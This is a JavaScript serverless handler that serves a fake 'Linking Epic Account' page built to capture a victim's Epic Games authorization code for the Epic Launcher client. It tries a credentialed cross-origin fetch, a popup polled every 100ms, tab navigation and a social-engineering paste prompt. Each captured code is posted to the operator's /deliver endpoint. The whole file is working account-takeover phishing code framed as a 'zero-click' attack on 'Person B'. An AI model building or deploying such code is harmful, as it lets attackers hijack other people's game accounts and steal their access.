/**
 * GET /pop/:token
 *
 * The real zero-click approach — runs in Person B's browser.
 *
 * STRATEGY: Epic returns Access-Control-Allow-Credentials: true and Vary: Origin.
 * When a browser with Epic cookies makes a fetch() with credentials: 'include',
 * Epic MAY reflect Access-Control-Allow-Origin back matching the request origin.
 * If it does — we can read the JSON directly. Zero clicks, zero redirects.
 *
 * We try multiple approaches in order:
 *
 * 1. Direct fetch with credentials:include — if Epic reflects ACAO, we read the code
 * 2. Popup + aggressive polling (every 100ms, multiple strategies)
 * 3. Popup + try reading document.body when popup reaches null-origin state
 * 4. Navigate current tab + BroadcastChannel to catch when we come back
 * 5. Manual paste fallback (last resort)
 */
import { getSession } from './_db.js';

const LAUNCHER_ID = '34a02cf8f4414e29b15921876da36f9a';

export default async function handler(req, res) {
  const token = String(req.url.split('/pop/')[1] || '').split('?')[0].trim();

  const s = await getSession(token);
  if (!s) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(410).send(`<html><body style="background:#080808;color:#888;font-family:sans-serif;padding:40px;text-align:center">
      <p>Session expired. Ask for a new link.</p></body></html>`);
  }

  const base       = `https://${req.headers.host}`;
  const deliverUrl = `${base}/deliver`;
  const epicUrl    = `https://www.epicgames.com/id/api/redirect?clientId=${LAUNCHER_ID}&responseType=code`;
  const epicLogin  = `https://www.epicgames.com/id/login?redirectUrl=${encodeURIComponent(epicUrl)}`;

  console.log(`[POP] token=${token.slice(0,8)} serving`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Linking…</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#080808;color:#d0d0d0;font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{background:#101010;border:1px solid #1e1e1e;border-radius:20px;padding:40px 36px;max-width:440px;width:100%;text-align:center}
    .spinner{width:44px;height:44px;border:3px solid #1e1e1e;border-top-color:#00e676;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 24px}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{color:#fff;font-size:1.2em;margin-bottom:8px}
    .sub{color:#555;font-size:0.85em;line-height:1.6;margin-bottom:20px}
    .st{font-size:0.82em;color:#00e676;min-height:18px;margin-bottom:16px}
    .st.err{color:#ff5252}
    .manual{display:none;text-align:left;margin-top:8px}
    .manual.show{display:block}
    .ml{font-size:0.75em;color:#444;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
    input{width:100%;background:#161616;border:2px solid #252525;border-radius:10px;color:#fff;padding:13px 14px;font-size:1em;font-family:monospace;outline:none;transition:border .15s}
    input:focus{border-color:#00e676}
    input::placeholder{color:#2a2a2a}
    .ob{display:block;width:100%;background:#00e676;color:#000;border:none;border-radius:10px;padding:13px;font-size:.9em;font-weight:700;cursor:pointer;margin-top:10px}
    .ob:hover{opacity:.85}
    .success{display:none;text-align:center;padding:10px 0}
    .success.show{display:block}
    .success .icon{font-size:2.6em;margin-bottom:12px}
    .success h2{color:#00e676}
    .success p{color:#555;font-size:0.85em;margin-top:8px}
  </style>
</head>
<body>
<div class="card">
  <div id="mv">
    <div class="spinner" id="sp"></div>
    <h2>Linking Epic Account</h2>
    <p class="sub" id="sub">Connecting to Epic Games…</p>
    <div class="st" id="st"></div>
    <div class="manual" id="mb">
      <div class="ml">Paste code from Epic page</div>
      <input type="text" id="ci" placeholder="32-char code…" maxlength="36" autocomplete="off" spellcheck="false">
      <button class="ob" onclick="openEpicManual()">Open Epic Page</button>
    </div>
  </div>
  <div class="success" id="sv">
    <div class="icon">✅</div><h2>Account Linked!</h2><p>You can close this window.</p>
  </div>
</div>

<script>
const TOKEN       = '${token}';
const DELIVER_URL = '${deliverUrl}';
const EPIC_URL    = '${epicUrl}';
const EPIC_LOGIN  = '${epicLogin}';

let submitted = false;
let popup = null;
let stage = 0; // 0=fetch, 1=popup, 2=manual

function st(m, err) {
  const el = document.getElementById('st');
  el.textContent = m;
  el.className = 'st' + (err ? ' err' : '');
}

function showSuccess() {
  document.getElementById('mv').style.display = 'none';
  document.getElementById('sv').className = 'success show';
}

function showManual() {
  document.getElementById('sp').style.display = 'none';
  document.getElementById('sub').textContent = 'Follow these steps to complete:';
  document.getElementById('mb').className = 'manual show';
}

function extractCode(t) {
  const m = t.match(/"authorizationCode"\\s*:\\s*"([a-f0-9]{32})"/i)
         || t.match(/"code"\\s*:\\s*"([a-f0-9]{32})"/i)
         || t.match(/[?&]code=([a-f0-9]{32})/i)
         || t.match(/authorized[/?].*code=([a-f0-9]{32})/i);
  return m ? m[1] : null;
}

async function deliver(code) {
  if (submitted) return;
  submitted = true;
  if (popup && !popup.closed) popup.close();
  st('Submitting…');
  try {
    const r = await fetch(DELIVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: TOKEN, code }),
    });
    const d = await r.json();
    if (d.ok) { showSuccess(); }
    else { submitted = false; st('Error: ' + (d.error || '?'), true); showManual(); }
  } catch(e) {
    submitted = false; st('Network error', true); showManual();
  }
}

// ═══════════════════════════════════════════════════════════════════
// STRATEGY 1: Direct fetch with credentials
// Epic sends Access-Control-Allow-Credentials: true + Vary: Origin.
// When browser sends request WITH Epic cookies, Epic may reflect
// Access-Control-Allow-Origin matching our origin — letting us read it.
// ═══════════════════════════════════════════════════════════════════
async function tryDirectFetch() {
  st('Trying direct fetch…');
  try {
    const r = await fetch(EPIC_URL, {
      method: 'GET',
      credentials: 'include',  // sends Epic session cookies
      mode: 'cors',
      headers: { 'Accept': 'application/json' }
    });
    if (r.ok) {
      const data = await r.json();
      console.log('[FETCH] response:', JSON.stringify(data).slice(0, 100));
      if (data.authorizationCode && data.authorizationCode !== 'null') {
        console.log('[FETCH] ✅ Got code via direct fetch!', data.authorizationCode);
        deliver(data.authorizationCode);
        return true;
      }
      if (data.authorizationCode === null && data.redirectUrl) {
        // CORS worked but user not logged in — redirectUrl shows localhost
        // Try the login URL approach
        console.log('[FETCH] CORS works but not logged in, trying login redirect');
        return false;
      }
    }
  } catch(e) {
    // CORS blocked — expected if Epic doesn't reflect our origin
    console.log('[FETCH] blocked:', e.message);
  }
  return false;
}

// ═══════════════════════════════════════════════════════════════════
// STRATEGY 2: Popup with aggressive 100ms polling
// Open popup, poll every 100ms for:
//   a) popup.location readable (localhost failed nav)
//   b) popup.document.body readable (null origin state)
//   c) popup closed unexpectedly
// ═══════════════════════════════════════════════════════════════════
function tryPopup() {
  st('Opening Epic…');
  const w=500,h=660,l=Math.max(0,(screen.width-w)/2),t=Math.max(0,(screen.height-h)/2);
  popup = window.open(EPIC_URL, 'epicauth',
    'width='+w+',height='+h+',left='+l+',top='+t+',toolbar=no,menubar=no,scrollbars=yes');

  if (!popup || popup.closed) {
    console.log('[POPUP] blocked');
    return false;
  }

  st('Waiting for Epic…');
  let ticks = 0;
  let lastHref = '';

  const poll = setInterval(() => {
    ticks++;

    if (!popup || popup.closed) {
      clearInterval(poll);
      if (!submitted) { st(''); showManual(); }
      return;
    }

    // ── Try reading location ──────────────────────────────────
    let href = null;
    try { href = popup.location.href; } catch(_) {}

    if (href && href !== 'about:blank' && href !== lastHref) {
      lastHref = href;
      console.log('[POPUP] href:', href.slice(0, 80));

      // Got a readable URL — try to extract code
      let code = extractCode(href);

      // Try body if location readable
      if (!code) {
        try {
          const body = popup.document?.body?.innerText || popup.document?.body?.innerHTML || '';
          if (body) {
            code = extractCode(body);
            if (code) console.log('[POPUP] code from body text');
          }
        } catch(_) {}
      }

      if (code) {
        clearInterval(poll);
        deliver(code);
        return;
      }

      // Readable but no code — error page
      if (href.includes('localhost') || href.includes('chrome-error') ||
          href.includes('about:neterror') || href === 'about:blank') {
        clearInterval(poll);
        st('');
        showManual();
        return;
      }
    }

    // ── Try reading body even when cross-origin (sometimes works in edge cases) ──
    if (ticks % 5 === 0) { // every 500ms
      try {
        // This throws SecurityError normally — but may succeed on:
        // 1. Same-origin pages (about:blank before nav)
        // 2. Null-origin error pages
        // 3. Edge/Firefox with certain security policies
        const body = popup.document?.body?.innerText || '';
        if (body && body.length > 10) {
          const code = extractCode(body);
          if (code) {
            console.log('[POPUP] ✅ code from cross-origin body!', code);
            clearInterval(poll);
            deliver(code);
            return;
          }
        }
      } catch(_) {}
    }

    // Timeout after 90s
    if (ticks > 900) {
      clearInterval(poll);
      if (!submitted) { st(''); showManual(); }
    }
  }, 100); // 100ms polling — much faster than before

  return true;
}

// ═══════════════════════════════════════════════════════════════════
// STRATEGY 3: Navigate current tab + BroadcastChannel
// Store token in localStorage, navigate to Epic.
// When user hits Back (or Epic redirects to localhost and browser
// goes back), our page reloads via bfcache and checks localStorage.
// ═══════════════════════════════════════════════════════════════════
function tryTabNavigate() {
  // Store state before navigating away
  localStorage.setItem('epic_auth_token', TOKEN);
  localStorage.setItem('epic_auth_deliver', DELIVER_URL);
  localStorage.setItem('epic_auth_ts', Date.now().toString());
  // Navigate the whole tab to Epic — no popup, user just sees Epic page briefly
  window.location.replace(EPIC_URL);
}

// Check if we're coming back from Epic (bfcache restore or back button)
function checkBfcache() {
  const storedToken = localStorage.getItem('epic_auth_token');
  const storedTs = parseInt(localStorage.getItem('epic_auth_ts') || '0');
  if (storedToken === TOKEN && Date.now() - storedTs < 120000) {
    // We navigated away and came back — but we don't have the code
    // The URL would have changed to localhost if Epic redirected
    // Check if current URL or referrer has the code
    const code = extractCode(document.referrer || '') ||
                 extractCode(location.href || '');
    if (code) {
      localStorage.removeItem('epic_auth_token');
      deliver(code);
      return true;
    }
    localStorage.removeItem('epic_auth_token');
  }
  return false;
}

// ═══════════════════════════════════════════════════════════════════
// Manual fallback
// ═══════════════════════════════════════════════════════════════════
function openEpicManual() {
  window.open(EPIC_URL, '_blank');
  st('Copy the "authorizationCode" value from the Epic page that opened ↗');
  setTimeout(() => document.getElementById('ci').focus(), 400);
}

document.getElementById('ci').addEventListener('input', function() {
  const v = this.value.trim().replace(/[^a-f0-9]/gi,'');
  if (v.length === 32 && !submitted) {
    st('Code detected — submitting…');
    setTimeout(() => deliver(v.toLowerCase()), 150);
  }
});

// ═══════════════════════════════════════════════════════════════════
// BOOT — run strategies in sequence
// ═══════════════════════════════════════════════════════════════════
(async function boot() {
  // First check if we're back from a tab navigation
  if (checkBfcache()) return;

  // Strategy 1: direct fetch (zero interaction if Epic reflects ACAO)
  const fetchWorked = await tryDirectFetch();
  if (fetchWorked) return;

  // Strategy 2: popup with 100ms polling
  const popupOpened = tryPopup();
  if (!popupOpened) {
    // Popup was blocked — show manual
    showManual();
    return;
  }

  // Reveal manual fallback after 3s (popup still trying in background)
  // User doesn't need to do anything unless popup fails
  setTimeout(() => {
    if (!submitted) {
      document.getElementById('mb').className = 'manual show';
      st('Still trying… or paste code below if you see it in the popup');
    }
  }, 3000);
})();
</script>

<!-- pageshow catches bfcache restore (back button from Epic) -->
<script>
window.addEventListener('pageshow', function(e) {
  if (e.persisted && !submitted) {
    // Page restored from bfcache after navigating away
    const code = extractCode(document.referrer || '') ||
                 extractCode(performance.navigation ? '' : '');
    if (code) deliver(code);
  }
});
</script>
</body>
</html>`);
}
